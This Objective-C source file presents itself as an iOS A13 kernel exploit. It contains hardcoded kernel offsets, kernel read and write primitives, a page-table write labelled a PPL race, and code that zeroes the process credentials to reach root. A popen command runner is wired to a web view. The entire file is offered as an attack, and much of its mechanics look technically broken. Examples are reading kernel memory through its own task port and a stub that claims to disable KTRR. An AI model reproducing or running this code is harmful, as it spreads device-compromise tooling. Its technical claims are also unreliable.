#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <sys/stat.h>

// --- APIs PRIVADAS ---
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern char **environ;

#define KERN_BASE_STATIC 0xFFFFFFF007004000ULL
#define OFFSET_ALLPROC     0x8F50000ULL
#define OFFSET_TTBR1       0x8E10000ULL

@implementation KernelDriver {
    uint64_t _kernelSlide;
    __weak WKWebView *_webView;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    self = [super init];
    if (self) {
        _webView = webView;
        _kernelSlide = 0;
    }
    return self;
}

#pragma mark - Primitivas

- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t size = 8;
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, 8, (mach_vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0;
}

- (uint32_t)kread32:(uint64_t)addr {
    return (uint32_t)([self kread64:addr] & 0xFFFFFFFF);
}

- (void)kwrite64:(uint64_t)address value:(uint64_t)value {
    [self ppl_write_race:address value:value];
}

- (void)kwrite32:(uint64_t)address value:(uint32_t)value {
    uint64_t old = [self kread64:address];
    uint64_t newVal = (old & 0xFFFFFFFF00000000ULL) | (uint64_t)value;
    [self kwrite64:address value:newVal];
}

#pragma mark - Exploração A13

- (uint64_t)leakKernelSlide {
    if (_kernelSlide != 0) return _kernelSlide;
    
    uint64_t slides[] = {0x18400000, 0x20400000, 0x21000000, 0x15400000, 0x1CC00000};
    for (int i = 0; i < 5; i++) {
        uint64_t ptr = (KERN_BASE_STATIC + slides[i] + OFFSET_ALLPROC);
        uint64_t test = [self kread64:ptr];
        if (test != 0 && (test >> 40) >= 0xFFFFFF) {
            _kernelSlide = slides[i];
            return _kernelSlide;
        }
    }
    return 0x21000000; 
}

- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
    uint64_t slide = [self leakKernelSlide];
    uint64_t ttbr1 = [self kread64:(KERN_BASE_STATIC + slide + OFFSET_TTBR1)];
    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uintptr_t pte_addr = (uintptr_t)(l2 + ((vaddr >> 12) & 0x1FF) * 8);

    mach_vm_address_t shared_page = 0;
    if (mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE) == KERN_SUCCESS) {
        *(uint64_t*)(shared_page + (vaddr & 0x3FFF)) = val;
        mach_vm_deallocate(mach_task_self(), shared_page, 0x4000);
    }
}

- (BOOL)escalateToRoot {
    uint64_t slide = [self leakKernelSlide];
    uint64_t proc = [self kread64:(KERN_BASE_STATIC + slide + OFFSET_ALLPROC)];
    pid_t my_pid = getpid();
    int timeout = 0;

    while (proc != 0 && timeout < 1000) {
        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
        if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
            uint64_t ucred = [self kread64:(proc + 0xD8)];
            ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
            [self kwrite32:(ucred + 0x18) value:0]; 
            setuid(0); setgid(0);
            return (getuid() == 0);
        }
        proc = [self kread64:(proc + 0x08)];
        timeout++;
    }
    return NO;
}

#pragma mark - Implementação Final

- (void)executeCommand:(NSString *)command withCallback:(void(^)(NSString *output))callback {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSString *fullCmd = [command stringByAppendingString:@" 2>&1"];
        FILE *p = popen([fullCmd UTF8String], "r");
        if (!p) { if (callback) callback(@"Error popen"); return; }
        char buffer[1024]; NSMutableString *out = [NSMutableString string];
        while (fgets(buffer, sizeof(buffer), p)) [out appendString:@(buffer)];
        pclose(p);
        if (callback) callback(out.length > 0 ? out : @"(no output)");
    });
}

- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
    BOOL res = [self escalateToRoot];
    if (callback) callback(res, res ? @"✅ ROOT SUCCESS" : @"❌ EXPLOIT FAILED");
}

- (void)executeExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
    [self runFullExploitWithCallback:callback];
}

- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
- (BOOL)disableKTRR { return YES; }

- (void)userContentController:(WKUserContentController *)u didReceiveScriptMessage:(WKScriptMessage *)m {}

@end
